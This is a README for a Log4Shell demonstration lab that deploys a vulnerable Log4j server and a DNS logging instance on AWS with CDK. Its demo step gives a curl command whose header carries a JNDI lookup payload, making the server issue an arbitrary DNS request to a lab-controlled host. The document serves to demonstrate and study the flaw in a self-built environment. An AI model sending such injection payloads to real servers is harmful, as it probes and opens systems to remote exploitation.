# Log4Shell Demo

Demonstration of [Log4Shell](https://en.wikipedia.org/wiki/Log4Shell) vulnerability.

## Deploy

Stack name is **Log4ShellStack**. It will be deployed to the default account and region configured in `~/.aws/config`. Refer to CDK [installation guide](https://docs.aws.amazon.com/cdk/v2/guide/getting_started.html#getting_started_prerequisites).

Before deploying this stack, create/upload an SSH keypair or specify your existing one. Inbound connection to deployed instances is limited to your public IP, `curl -s http://portquiz.net | grep 'IP' | cut -d' ' -f3` to see your IP.

```
# Create venv
python -m venv .venv
source .venv/bin/activate

# Install CDK libraries
pip install -r requirements.txt -q

# Generate CloudFormation template
mkdir -p cdk.out
cdk synth -c key_name=ssh-keypair-name -c ip=your-public-ip > cdk.out/template.yml

# Review cdk.out/template.yml

# Deploy
cdk deploy -c key_name=ssh-keypair-name -c ip=your-public-ip -v
```

## Demo

1. Note down the public IP of Log4ShellLog4JInstance and private IP of Log4ShellDNSInstance.
2. Remote into Log4ShellDNSInstance using Session Manager or SSH. In that instance, run `journalctl -xe -u unbound -f`
3. In your local machine, `curl -L http://log4j-public-ip -H 'X-Api-Version: ${jndi:dns://dns-private-ip/evil-request}'`
  - The response will be `Hello, world!`.
4. Back in Log4ShellDNSInstance, it should show this log message,
  - `# Jan 1 01:23:45 ip-a-b-c-d unbound[pid]: [pid:0] info: log4j-private-ip evil-request. A IN`

This demonstrate the ability to instruct a vulnerable server to make an arbitrary DNS request.

## Credit

[christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)
